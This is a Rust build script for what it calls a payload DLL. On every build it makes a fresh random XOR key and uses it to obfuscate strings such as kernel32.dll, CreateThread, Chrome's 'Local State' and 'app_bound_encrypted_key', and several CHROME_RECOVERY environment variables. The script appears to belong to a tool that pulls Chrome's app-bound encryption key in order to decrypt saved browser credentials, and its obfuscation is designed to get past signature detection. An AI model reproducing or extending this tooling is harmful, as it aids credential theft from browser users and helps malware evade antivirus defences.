use std::{env, fs, path::PathBuf};

fn xor_encode_hex(plaintext: &str, key: u8) -> String {
    plaintext.bytes().map(|b| format!("{:02x}", b ^ key)).collect()
}

fn main() {
    println!("cargo:rustc-link-lib=ole32");
    println!("cargo:rustc-link-lib=oleaut32");

    // Generate a per-build random XOR key for the payload's internal string
    // obfuscation, so the payload DLL has different constants each build.
    let out_dir = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR"));

    let key: u8 = env::var("PAYLOAD_INTERNAL_XOR_KEY")
        .ok()
        .and_then(|s| s.parse::<u8>().ok())
        .unwrap_or_else(|| {
            use std::collections::hash_map::DefaultHasher;
            use std::hash::{Hash, Hasher};
            let mut h = DefaultHasher::new();
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
                .hash(&mut h);
            std::process::id().hash(&mut h);
            env::var("CARGO_PKG_VERSION").unwrap_or_default().hash(&mut h);
            ((h.finish() & 0xFE) as u8) | 1
        });

    // Write xor key module
    let xor_path = out_dir.join("payload_xor_key.rs");
    fs::write(&xor_path, format!("pub const KEY: u8 = 0x{:02X};\n", key))
        .expect("write payload_xor_key.rs");

    // Binary string constants (XOR'd byte arrays) for kernel32/CreateThread/env vars
    let bin_strings = [
        ("K32_DLL",       "kernel32.dll"),
        ("CREATE_THREAD", "CreateThread"),
        ("APPDATA_ENV",   "APPDATA"),
        ("LOCAL_ENV",     "LOCALAPPDATA"),
    ];
    let mut bin_lines = vec![
        "// AUTO-GENERATED — DO NOT EDIT".to_string(),
        format!("// payload build-time XOR key: 0x{:02X}", key),
        String::new(),
    ];
    for (name, plaintext) in &bin_strings {
        let enc: Vec<String> = plaintext.bytes().map(|b| format!("0x{:02X}", b ^ key)).collect();
        bin_lines.push(format!("pub const {}: &[u8] = &[{}];", name, enc.join(", ")));
    }
    let str_path = out_dir.join("payload_strings.rs");
    fs::write(&str_path, bin_lines.join("\n") + "\n").expect("write payload_strings.rs");

    // Hex-encoded strings used with xor::decode() in lib.rs and elv.rs
    // These are the strings that appear as hex literals in source code.
    let hex_strings = [
        ("LOCAL_STATE",       "Local State"),
        ("APP_BOUND_KEY",     "app_bound_encrypted_key"),
        ("RESULT_ENV_HEX",    "CHROME_RECOVERY_RESULT"),
        ("USER_DATA_ENV_HEX", "CHROME_RECOVERY_USER_DATA_REL"),
        ("DATA_ROOT_ENV_HEX", "CHROME_RECOVERY_DATA_ROOT"),
        ("CHROME_CLSID_ENV",  "CHROME_RECOVERY_CLSID"),
    ];
    let mut hex_lines = vec![
        "// AUTO-GENERATED — DO NOT EDIT".to_string(),
        format!("// payload build-time hex strings, XOR key: 0x{:02X}", key),
        String::new(),
    ];
    for (name, plaintext) in &hex_strings {
        let enc = xor_encode_hex(plaintext, key);
        hex_lines.push(format!("pub const {}: &str = \"{}\";", name, enc));
    }
    let hex_path = out_dir.join("payload_hex_strings.rs");
    fs::write(&hex_path, hex_lines.join("\n") + "\n").expect("write payload_hex_strings.rs");

    println!("cargo:rerun-if-env-changed=PAYLOAD_INTERNAL_XOR_KEY");
}
